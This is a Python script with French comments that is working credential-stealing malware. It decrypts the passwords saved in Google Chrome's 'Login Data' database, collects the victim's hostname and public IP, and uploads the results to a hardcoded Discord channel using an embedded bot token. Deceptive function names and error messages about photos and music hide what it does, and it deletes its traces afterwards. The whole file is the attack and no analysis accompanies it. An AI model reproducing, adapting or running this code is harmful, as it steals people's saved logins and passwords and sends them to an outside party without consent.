import os
import json
import base64
import sqlite3
import win32crypt
from Crypto.Cipher import AES
import shutil
from datetime import timezone, datetime, timedelta
import socket
import requests
import discord
from discord.ext import commands
import asyncio
ID_DU_SALON = 1213908014600298506  # Remplacez ceci par l'ID réel de votre salon
# Fonction pour envoyer le fichier texte dans le salon spécifié
async def envoyer_fichier(token, nom_fichiers):
    # Création du bot avec les intentions
    intents = discord.Intents.default()
    intents.all()

    bot = commands.Bot(command_prefix='!', intents=intents)

    # Nom du fichier texte à envoyer
    nom_fichier = nom_fichiers

    try:
        # Ouvrir le fichier en mode lecture
        with open(nom_fichier, 'r', encoding='utf-8') as fichier:
            # Lire le contenu du fichier
            contenu = fichier.read()

        # Événement lorsque le bot est prêt
        @bot.event
        async def on_ready():

            # Récupérer l'objet salon en utilisant l'ID
            salon = bot.get_channel(ID_DU_SALON)

            if salon:
                # Créer un objet File à partir du fichier
                fichier_discord = discord.File(nom_fichier, filename=f"{nom_fichiers}.txt")

                # Envoyer le fichier dans le salon Discord
                await salon.send(file=fichier_discord)
            else:
                print("Image(s) non trouvée(s)")

            # Déconnecter le bot après l'envoi du fichier
            await bot.close()

        # Lancer le bot avec le token
        await bot.start(token)

    except FileNotFoundError:
        # Si le fichier n'est pas trouvé, afficher un message d'erreur
        print("Les fichier n'ont pas été trouvé.")

# Token de votre bot Discord
TOKEN = 'MTIxMzk0ODQ2NDQ1OTY4MTgyMg.GRJ_nh.OF9coRBUn2eJMmcbXgs8hgJbkLrMFzLeYfyuos'

nom_ordi = socket.gethostname()

def get_chrome_datetime(chromedate):
    return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)

def get_encryption_key():
    local_state_path = os.path.join(os.environ["USERPROFILE"],
                                    "AppData", "Local", "Google", "Chrome",
                                    "User Data", "Local State")
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = f.read()
        local_state = json.loads(local_state)
    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    key = key[5:]
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

def decrypt_password(password, key):
    try:
        iv = password[3:15]
        password = password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(password)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            return ""
        
def pics_fly():
    key = get_encryption_key()
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                            "Google", "Chrome", "User Data", "default", "Login Data")
    filename = "img/ChromeData.db"
    try:
        shutil.copyfile(db_path, filename)
    except:
        print("Erreur, fichier musique introuvable.")
    db = sqlite3.connect(filename)
    cursor = db.cursor()
    cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
    for row in cursor.fetchall():
        origin_url = row[0]
        action_url = row[1]
        username = row[2]
        password = decrypt_password(row[3], key)
        date_created = row[4]
        date_last_used = row[5]        
        if username or password:
            with open(f"img/{nom_ordi}.txt", "a") as file:
                file.write(f"Origin URL: {origin_url}\nAction URL: {action_url}\nUsername: {username}\nPassword: {password}\n")
        else:
            continue
        if date_created != 86400000000 and date_created:
            with open(f"img/{nom_ordi}.txt", "a") as file:
                file.write(f"Creation date: {str(get_chrome_datetime(date_created))}\n")
        if date_last_used != 86400000000 and date_last_used:
            with open(f"img/{nom_ordi}.txt", "a") as file:
                file.write(f"Last Used: {str(get_chrome_datetime(date_last_used))}\n")
        with open(f"img/{nom_ordi}.txt", "a") as file:
            file.write("=============================================================================\n")
    cursor.close()
    db.close()
    try:
        os.remove(filename)
    except:
        pass
    try:
        nom_fichier=f"img/{nom_ordi}.txt"
        if os.path.exists(nom_fichier):
            asyncio.run(envoyer_fichier(TOKEN, nom_fichier))
            os.remove(nom_fichier)
            pass
        else:
            pass
    except Exception as e:
        pass

def decalage_photo():
    try:
        response = requests.get('https://httpbin.org/ip')
        ip_publique = response.json().get('origin')
        return ip_publique
    except Exception as e:
        pass
        return None

try:
    if not os.path.exists("img"):
        os.makedirs("img")
    with open(f"img/{nom_ordi}.txt", "w") as file:
        file.close()
    ip_publique = decalage_photo()
    with open(f"img/{nom_ordi}.txt", "a") as file:
        file.write(f"{nom_ordi}\n{ip_publique}\n\n\n")
except:
    print("Erreur, dossier img ou musique manquant.")
